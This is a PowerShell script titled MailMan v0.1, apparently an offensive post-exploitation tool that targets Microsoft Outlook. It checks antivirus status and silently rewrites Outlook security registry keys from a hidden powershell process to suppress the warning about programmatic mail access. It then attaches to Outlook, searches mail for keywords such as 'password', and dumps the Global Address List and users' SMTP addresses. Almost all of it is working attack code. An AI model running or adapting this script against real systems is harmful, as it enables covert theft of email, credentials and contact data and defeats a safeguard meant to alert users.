#requires -version 2

<#


MailMan v0.1

by @xorrior

#>



Function Get-OSVersion {

    <#
    .SYNOPSIS
    Determines the Operating System version of the host

    .Example
    Check-OSVersion

    #>

    #Function to grab the major and minor verions to determine the OS. 
    Write-Verbose "Detecting OS..."
    $OS = [environment]::OSVersion.Version


    if($OS.Major -eq 10){
        $OSVersion = "Windows 10"
    }

    #if the major version is 6, the OS can be from Vista to Windows 8.1
    if($OS.Major -eq 6){
        switch ($OS.Minor){
            3 {$OSVersion = "Windows 8.1/Server 2012 R2"}
            2 {$OSVersion = "Windows 8/Server 2012"}
            1 {$OSVersion = "Windows 7/Server 2008 R2"}
            0 {$OSVersion = "Windows Vista/Server 2008"}
        }
    }
    if($OS.Major -eq 5){
        switch ($OS.Minor){
            2 {$OSVersion = "Windows XP/Server 2003 R2"}
            1 {$OSVersion = "Windows XP"}
            0 {$OSVersion = "Windows 2000"}

        }
    }

    Write-Verbose "Checking the bitness of the OS"
    if((Get-WmiObject -class win32_operatingsystem).OSArchitecture -eq "64-bit"){
        $OSArch = 64
    }
    else{
        $OSArch = 32
    }
    $OSVersion
    $OSArch 
}

Function Disable-SecuritySettings{

    <#
    .SYNOPSIS
    This function checks for the existence of the Outlook security registry keys ObjectModelGuard, PromptOOMSend, and AdminSecurityMode. If 
    the keys exist, overwrite with the appropriate values to disable to security prompt for programmatic access.

    .DESCRIPTION
    This function checks for the ObjectModelGuard, PromptOOMSend, and AdminSecurityMode registry keys for Outlook security. Most likely, this function must be 
    run in an administrative context in order to set the values for the registry keys. 

    .PARAMETER Version
    The version of microsoft outlook. This is pertinent to the location of the registry keys. 

    .EXAMPLE
    Disable-SecuritySettings -Version 15

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False)]
        [string]$User,

        [Parameter(Mandatory = $False)]
        [string]$Password,

        [parameter(Mandatory = $True)]
        [string]$Version
    )

    $Version = $Version.Substring(0,4)

    #Check AV to see if it's up to date. 
    $AV = Get-WmiObject -namespace root\SecurityCenter2 -class Antivirusproduct
    if($AV){
        $AVstate = $AV.productState
        $statuscode = '{0:X6}' -f $AVstate
        $wscupdated = $statuscode[4,5] -join '' -as [byte]
        if($wscupdated -eq  (00 -as [byte]))
        {
            Write-Verbose "AV is up to date"
            $AVUpdated = $True
        }
        elseif($wscupdated -eq (10 -as [byte])){
            Write-Verbose "AV is not up to date"
            $AVUpdated = $False
        }
        else{
            Write-Verbose "Unable to determine AV status"
            $AVUpdated = $False 
        }
    }
    else{
        Write-Verbose "AV not installed"
        $AVUpdated = $False
    }
    

    $LMSecurityKey = "HKLM:\SOFTWARE\Microsoft\Office\$Version\Outlook\Security"
        
    $CUSecurityKey = "HKCU:\SOFTWARE\Policies\Microsoft\Office\$Version\outlook\security"

    $ObjectModelGuard = "ObjectModelGuard"
    $PromptOOMSend = "PromptOOMSend"
    $AdminSecurityMode = "AdminSecurityMode" 

    if(!(Test-Path $LMSecurityKey)){
        #if the key does not exists, create or update the appropriate reg keys values.
        $cmd = "New-Item $LMSecurityKey -Force;"
        $cmd += "New-ItemProperty $LMSecurityKey -Name $ObjectModelGuard -Value 2 -PropertyType DWORD -Force;"

        #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       

    }
    else{
            
        if((Get-ItemProperty $LMSecurityKey -Name $ObjectModelGuard).ObjectModelGuard){

            $cmd = "Set-ItemProperty $LMSecurityKey -Name $ObjectModelGuard -Value 2 -Force;" 
        }
        else{
            $cmd = "New-ItemProperty $LMSecurityKey -Name $ObjectModelGuard -Value 2 -PropertyType DWORD -Force;"
        }

        #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       
                
    }
    if(!(Test-Path $CUSecurityKey)){

        $cmd += "New-Item $CUSecurityKey -Force;"
        $cmd += "New-ItemProperty $CUSecurityKey -Name $PromptOOMSend -Value 2 -PropertyType DWORD -Force;" 
        $cmd += "New-ItemProperty $CUSecurityKey -Name $AdminSecurityMode -Value 3 -PropertyType DWORD -Force;"

        #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       
    }
    else{
        if((Get-ItemProperty $CUSecurityKey -Name $PromptOOMSend).PromptOOMSend){
                
            $cmd += "Set-ItemProperty $CUSecurityKey -Name $PromptOOMSend -Value 2 -Force;"
        }
        else{
            $cmd += "New-ItemProperty $CUSecurityKey -Name $PromptOOMSend -Value 2 -PropertyType DWORD -Force;"
        }

        If((Get-ItemProperty $CUSecurityKey -Name $AdminSecurityMode).$AdminSecurityMode){
            $cmd += "Set-ItemProperty $CUSecurityKey -Name $AdminSecurityMode -Value 3 -Force"
        }
        else{
            $cmd += "New-ItemProperty $CUSecurityKey -Name $AdminSecurityMode -Value 3 -PropertyType DWORD -Force"
        }
            
        #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       
    }

    if($User -and $Password){

        $pw = ConvertTo-SecureString $Password -asplaintext -Force
        $creds = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$pw
        Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd

    }
    else{

        Start-Process powershell.exe -WindowStyle hidden -ArgumentList $cmd
    }
    

}


Function Reset-SecuritySettings{}

Function Invoke-ExitComObj{
    <#
    .SYNOPSIS
    This function destroys the Outlook Com object

    .EXAMPLE

    Invoke-ExitComObj

    #>

    $script:Outlook.quit()
}

Function Get-OutlookFolder{
    <#
    .SYNOPSIS
    This functions returns one of the Outlook top-level, default folders

    .PARAMETER Name
    Name of the desired folder. Default name is Inbox. 

    .EXAMPLE 
    Get-OutlookFolder -Name "Inbox"

    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True, Position = 0)]
        [String]$Name
    )

    $OlDefaultFolders = @{
        "olFolderCalendar" = 9
        "olFolderConflicts" = 19
        "olFolderContacts" = 10
        "olFolderDeletedItems" = 3
        "olFolderDrafts" = 16
        "olFolderInbox" = 6
        "olFolderJournal" = 11
        "olFolderJunk" = 23
        "olFolderLocalFailures" = 21
        "olFolderManageEmail" = 29
        "olFolderNotes" = 12
        "olFolderOutbox" = 4
        "olFolderSentMail" = 5
        "olFolderServerFailures" = 22
        "olFolderSuggestedContacts" = 30
        "olFolderSyncIssues" = 20
        "olFolderTasks" = 13
        "olFolderToDo" = 28
        "olPublicFoldersAllPublicFolders" = 18
        "olFolderRssFeeds" = 25
    }



    $DefaultFolderName = "olFolder$Name"

    $Value = $OlDefaultFolders.Item($DefaultFolderName)

    $FolderObj =  $script:MAPI.GetDefaultFolder($Value)

    Write-Verbose "Obtained Folder Object"

    $FolderObj

}

Function Get-EmailItems{
    <#
    .SYNOPSIS
    This function returns all of the items for the specified folder

    .PARAMETER Folder
    System.__ComObject for the Top Level folder

    .PARAMETER MaxEmails
    Maximum number of emails to grab

    .PARAMETER Full
    Return the Full mail item object

    .EXAMPLE
    Get-EmailItems -Folder "Inbox"

    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True, Position = 0)]
        [System.__ComObject]$Folder,

        [Parameter(Mandatory = $False, Position = 1)]
        [int]$MaxEmails,

        [Parameter(Mandatory = $False)]
        [switch]$FullObject
    )
    
    $FOlderObj = $Folder

    if($MaxEmails){
        $Items = $FolderObj.Items | Select-Object -First $MaxEmails
    }
    else{
        $Items = $FolderObj.Items
    }

    if(!($FullObject)){
        $Emails = @()
    
        $Items | ForEach {

            $Email = New-Object PSObject -Property @{
                To = $_.To
                FromName = $_.SenderName 
                FromAddress = $_.SenderEmailAddress
                Subject = $_.Subject
                Body = $_.Body
                TimeSent = $_.SentOn
                TimeReceived = $_.ReceivedTime

            }

            $Emails += $Email

        }
    }
    else{
        $Emails = $Items
    }
    

    $Emails 


}

Function Invoke-MailSearch{

    <#
    .SYNOPSIS
    This function searches the given Outlook folder for items (Emails, Contacts, Tasks, Notes, etc. *Depending on the folder*) and returns
    any matches found.

    .DESCRIPTION
    This function searches the given Outlook folder for items containing the specified keywords and returns any matches found. 

    .PARAMETER Folder
    Folder to search in. Default is the Inbox. 

    .PARAMETER Keyword
    Keyword/s to search for. The default is password

    .PARAMETER MaxResults
    Maximum number of results to return.

    .PARAMETER MaxSearch
    Maximum number of emails to search through
    
    .EXAMPLE
    Invoke-MailSearch -Keywords "admin", "password" -MaxResults 20

    Conduct a search on the Inbox with admin and password specified as keywords. Return a maximum of 20 results. 

    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True, Position = 0)]
        [string]$DefaultFolder,

        [Parameter(Mandatory = $True, Position = 1)]
        [string]$Keyword,

        [Parameter(Mandatory = $False, Position = 2)]
        [int]$MaxResults,

        [Parameter(Mandatory = $False, Position = 3)]
        [int]$MaxThreads,

        [Parameter(Mandatory = $False, Position = 4)]
        [int]$MaxSearch
    )

    $Results = @()

    $SearchEmailBlock = {

        param($Keyword, $MailItem)
        
        if(($MailItem.Subject -match $Keyword) -or ($MailItem.Body -match $Keyword)){
            $Email = New-Object PSObject -Property @{
                To = $MailItem.To
                FromName = $MailItem.SenderName 
                FromAddress = $MailItem.SenderEmailAddress
                Subject = $MailItem.Subject
                Body = $MailItem.Body
                TimeSent = $MailItem.SentOn
                TimeReceived = $MailItem.ReceivedTime
            }
        
        }
        $Email
    }


    $OF = Get-OutlookFolder -Name $DefaultFolder

    if($MaxSearch){
        $Emails = Get-EmailItems -Folder $OF -FullObject -MaxEmails $MaxSearch
    }
    else {
        $Emails = Get-EmailItems -Folder $OF -FullObject   
    }

    Clear-Host
    $pos = New-Object -TypeName System.Management.Automation.Host.Coordinates
    $pos.X = 0
    $pos.Y = 0
    $Host.ui.RawUI.CursorPosition = $pos    

    Write-Verbose "[*] Searching through $($Emails.count) emails....."


    #All of this multithreading magic is taken directly from harmj0y and his child, powerview
    #https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1#L5672
    $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
    $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

    #Get all the current variables for this runspace 
    $MyVars = Get-Variable -Scope 1

    $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

    #Add the variables from the current runspace to the new runspace 
    ForEach($Var in $MyVars){
        if($VorbiddenVars -notcontains $Var.Name){
            $sessionState.Variables.Add((New-Object -Typename System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var))
        }
    }

    
    Write-Verbose "Creating RunSpace Pool"
    $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
    $pool.Open()

    $jobs = @()
    $ps = @()
    $wait = @()

    $counter = 0
    $MsgCount = 1

    ForEach($Msg in $Emails){

        Write-Verbose "Searching Email # $MsgCount/$($Emails.count)"

        while ($($pool.GetAvailableRunSpaces()) -le 0){

            Start-Sleep -Milliseconds 500

        }

        $ps += [powershell]::create()

        $ps[$counter].runspacepool = $pool

        [void]$ps[$counter].AddScript($SearchEmailBlock).AddParameter('Keyword', $Keyword).AddParameter('MailItem', $Msg)

        $jobs += $ps[$counter].BeginInvoke();

        $wait += $jobs[$counter].AsyncWaitHandle

        $counter = $counter + 1
        $MsgCount = $MsgCount + 1

    }

    $waitTimeout = Get-Date 

    while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
        Start-Sleep -Milliseconds 500
    }

    for ($x = 0; $x -lt $counter; $x++){

        try {
            
            $Results += $ps[$x].EndInvoke($jobs[$x])

        }
        catch {
            Write-Warning "error: $_"
        }

        finally {

            $ps[$x].Dispose()
        }
    }

    $pool.Dispose()

    if($MaxResults){

       $Results | Select-Object -First $MaxResults
       Write-Host "`n"
 
    }
    else{
        $Results 
        Write-Host "`n"
    }
    
    #$Results = $Emails | Where-Object {($_.Subject -match "$Keyword") -or ($_.Body -match "$Keyword")} | Select-Object -First $MaxResults

    #$Results
}

Function Get-SubFolders{
    <#
    .SYNOPSIS
    This function returns a list of all the folders in the specified top level folder.

    .PARAMETER FolderName
    Name of the top-level folder to retrieve a list of folders from.

    .PARAMETER FullObject
    Return the full folder object instead of just the name

    .EXAMPLE
    Get-SubFolders -FolderName "SentMail"
    
    Get a list of folders and sub-folders from the sentmail box. 
    #>


    [CmdletBinding()]
    param(
        [parameter(Mandatory = $False, Position = 0)]
        [System.__ComObject]$Folder
    )

    $SubFolders = $Folder.Folders

    If(!($SubFolders)){
        Write-Verbose "No subfolders were found for folder: $($Folder.Name)"
    }

    if(!($Fullobject)){
        $SubFolders = $SubFolders | ForEach {$_.Name}
    }
    
    $SubFolders 
    


}

Function Get-GlobalAddressList{
    <#
    .SYNOPSIS
    This function returns an array of Contact objects from a Global Address List object.

    #>

    if($script:MAPI){
        $GAL = $script:MAPI.GetGlobalAddressList()
    }
    else {
        Throw "Unable to obtain the Global Address List"
    }

    $GAL = $GAL.AddressEntries
    $GAL 
}

Function Get-SMTPAddress{
    <#
    .SYNOPSIS
    Gets the PrimarySMTPAddress of a user.

    .DESCRIPTION
    This function returns the PrimarySMTPAddress of a user via the ExchangeUser object. 

    .PARAMETER FullName
    First and Last name of the user

    .OUTPUTS
    System.String . Primary email address of the user.

    #>

    [CmdletBinding()]
    Param(
        [string[]]
        $FullName
    )

    #Grab the GAL 
    $GAL = Get-GlobalAddressList
    #If the full name is given, try to obtain the exchange user object 
    If($FullName){
        try{
            $User = $GAL | Where-Object {$_.Name -eq $FullName}
        }
        catch {
            Throw "Unable to obtain exchange user object with the name: $FullName"
            break
        }
        $PrimarySMTPAddress = ($User.GetExchangeuser()).PrimarySMTPAddress
    }
    else{
        try {
            $PrimarySMTPAddress = (((($script:MAPI.CurrentUser).Session).CurrentUser).AddressEntry.GetExchangeuser()).PrimarySmtpAddress
        }
        catch{
            Throw "Unable to obtain primary smtp address for the current user"
        }
    }

    $PrimarySMTPAddress

}

Function Get-OutlookInstance{
    <#
    .SYNOPSIS
    Get an instance of Outlook. This function must be executed in the same user context of the Outlook application. Specify a Username and password of an admin level account if the 
    current user does not have administrative privileges. This level of access is needed to change/create the Outlook security registry keys. 

    .PARAMETER User
    Username of account with administrative privileges 

    .PARAMETER Pass
    Password of account with administrative privileges

    .EXAMPLE
    Get-OutlookInstance -User "TEST\cross" -Password "BAhbAhBlackSheep"

    Get an instance of Outlook and use the specified credentials to change the registry keys. 

    #>

    [CmdletBinding()]
    param(

        [parameter(Mandatory = $False, Position = 0)]
        [string]$Username,

        [parameter(Mandatory = $False, Position = 1)]
        [string]$Pass
    )

    #Switch user context from Administrator to the 
    Write-Verbose "Checking to see if Outlook is currently running"
    Add-Type -AssemblyName System.Runtime.InteropServices
    if(Get-Process | Where-Object {$_.ProcessName -eq "OUTLOOK"}){
        #If outlook is currently running, grab an instance. This script must be running in the same user context as Outlook in order for this to work.  
        try{
            $script:Outlook = [System.Runtime.InteropServices.Marshal]::GetActiveObject("Outlook.Application")
        }
        catch {
            Throw "Unable to obtain Outlook instance"
        }
    }
    else{
        #Start an Outlook instance
        try {
            $script:Outlook = New-Object -ComObject Outlook.Application   
        }
        catch {
            Throw "Unable to create Outlook com object"
        }
    }

    $OV = $script:Outlook.Version
    
    if($Username -and $Pass){
        Disable-SecuritySettings -User $Username -Password $Pass -Version $OV
        Write-Verbose "Security Prompt should be disabled"
    }
    else{
        Disable-SecuritySettings -Version $OV 
        Write-Verbose "Security Prompt should be disabled"
    }
    $Script:MAPI = $script:Outlook.GetNamespace('MAPI')
    $script:MAPI.Logon("", "", $NULL, $NULL)
    

}

